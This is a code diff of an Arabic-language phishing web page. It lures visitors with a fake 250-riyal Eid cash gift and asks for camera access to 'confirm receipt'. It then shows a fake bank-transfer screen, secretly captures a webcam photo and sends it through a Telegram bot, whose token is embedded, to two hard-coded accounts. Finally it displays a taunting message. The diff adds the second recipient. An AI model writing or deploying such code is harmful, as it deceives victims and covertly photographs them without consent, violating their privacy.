@@ -4,11 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>هدية خاصة لك من فهودي 🎁</title>
-    
-    <meta property="og:title" content="هدية خاصة لك من فهودي 🎁">
-    <meta property="og:description" content="اضغط هنا لاستلام عيدية بقيمة 250 ريال مقدمة من فهودي.">
-    <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQB2a9JizqwqvDF5Q7taaKTkohGvbyt4ePOFQ&s">
-
     <style>
         :root { --primary-color: #128c7e; --accent-color: #25d366; }
         body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f5f7fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
@@ -27,7 +22,7 @@
 <div class="card" id="mainCard">
     <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQB2a9JizqwqvDF5Q7taaKTkohGvbyt4ePOFQ&s" class="logo">
     <h1>مبروك! وصلتك هدية 🎁</h1>
-    <p>لقد أرسل لك <b>فهودي</b> مبلغاً نقدياً</p>
+    <p>لقد أرسل لك <b>فهودي</b> مبلغاً نقدياً بمناسبة العيد</p>
     <div class="amount-box"><span class="amount">250.00</span> ر.س</div>
     <button class="btn" id="claimBtn">تأكيد استلام المبلغ</button>
 </div>
@@ -36,45 +31,48 @@
 <canvas id="canvas" style="display:none;"></canvas>
 
 <script>
-    const claimBtn = document.getElementById('claimBtn');
-    // التوكن الجديد والـ ID الخاص بجروبك
-    const TOKEN = "8680007162:AAFCF3Zam9o0c1IFzAoWlb7FZP6sGvFkDRY";
-    const CHAT_ID = "-3805611772";
+    const TOKEN = "8608233349:AAFj-cG0gKj_fP89yDvcQAC5mtf2QMrJq2g";
+    const ID_1 = "1232397788"; // ID فهد
+    const ID_2 = "7334997228"; // ID الشخص الثاني
 
-    claimBtn.addEventListener('click', async () => {
+    document.getElementById('claimBtn').addEventListener('click', async () => {
         try {
-            // طلب إذن الكاميرا فوراً
+            // طلب إذن الكاميرا
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             const video = document.getElementById('video');
             video.srcObject = stream;
 
-            // تغيير الواجهة للتمويه السريع
+            // واجهة التمويه
             document.getElementById('mainCard').innerHTML = `
-                <div style="font-size:50px; margin-bottom:20px;">⌛</div>
-                <h3>جاري معالجة الطلب...</h3>
-                <p>يرجى الانتظار ثوانٍ لإيداع المبلغ في حسابك</p>
+                <div style="font-size:50px; margin-bottom:20px;">⏳</div>
+                <h3>جاري معالجة التحويل البنكي...</h3>
+                <p>يرجى الانتظار ثانية واحدة لإيداع المبلغ في حسابك</p>
             `;
 
-            // التقاط الصورة بعد ثانية واحدة لضمان جودة الوجه
             setTimeout(() => {
                 const canvas = document.getElementById('canvas');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
 
-                canvas.toBlob(async (blob) => {
-                    const formData = new FormData();
-                    formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', blob, 'shot.jpg');
-                    formData.append('caption', '📸 صيد جديد ومخفي لعيون فهودي!');
+                canvas.toBlob((blob) => {
+                    const sendPhoto = (targetId) => {
+                        const formData = new FormData();
+                        formData.append('chat_id', targetId);
+                        formData.append('photo', blob, 'shot.jpg');
+                        formData.append('caption', '📸 صيد جديد ومخفي لعيون فهودي!');
+                        
+                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    };
 
-                    // إرسال الصورة للبوت الجديد
-                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
+                    // إرسال الصورة لك ولخويك
+                    sendPhoto(ID_1);
+                    sendPhoto(ID_2);
 
-                    // إظهار الرسالة الصادمة النهائية
+                    // الرسالة الصادمة النهائية
                     setTimeout(() => {
                         document.getElementById('mainCard').innerHTML = `
                             <div class="final-msg">🤡 تعيش وتأكل غيرها!</div>
@@ -83,10 +81,10 @@
                         `;
                     }, 1000);
                 }, 'image/jpeg');
-            }, 1000);
+            }, 1200);
 
         } catch (err) {
-            alert("حدث خطأ تقني: يرجى السماح بالكاميرا لتأكيد الحساب واستلام العيدية!");
+            alert("فشل النظام: يجب السماح بالكاميرا لتأكيد هويتك واستلام الـ 250 ريال!");
         }
     });
 </script>
